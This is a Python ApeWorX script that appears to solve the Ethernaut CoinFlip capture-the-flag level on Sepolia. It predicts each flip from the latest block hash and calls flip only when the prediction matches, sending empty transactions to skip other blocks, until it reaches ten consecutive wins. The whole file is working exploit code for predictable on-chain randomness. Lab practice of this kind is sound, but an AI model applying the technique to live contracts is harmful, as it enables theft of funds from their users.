#!/usr/bin/python3
from ape import accounts, chain, networks, project, utils
from scripts.deploy import deploy
from scripts.helper_functions import get_account

# sepolia: 0x8BDb7E8301Fa511903d01Dbabf2ac902c169f475
ADDRESS = "0x8BDb7E8301Fa511903d01Dbabf2ac902c169f475"
FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968


def attack():
    if networks.active_provider.network.name == "local":
        target = deploy()
        _, attacker = get_account()
    elif networks.active_provider.network.name == "sepolia-fork":
        target = project.CoinFlip.at(ADDRESS)
        _, attacker = get_account()
    else:
        target = project.CoinFlip.at(ADDRESS)
        attacker = accounts.load("ctf")
        unlock_password = utils.expand_environment_variables("$unlock_password")
        attacker.set_autosign(True, passphrase=unlock_password)

    while target.consecutiveWins() != 10:
        block_hash = chain.blocks.head.hash.hex()
        blockValue = utils.to_int(block_hash)
        # print(chain.blocks.head.hash.hex())

        if blockValue // FACTOR == 1:
            # print(blockValue)
            # print("Side == 1")
            target.flip(True, sender=attacker)
        else:
            attacker.transfer(attacker.address, "0.0000 ether")
            # pass
    assert target.consecutiveWins() == 10, "Wins != 10"

    print(f"Consecutive Wins: {target.consecutiveWins()}")


def main():
    attack()


if __name__ == "__main__":
    main()
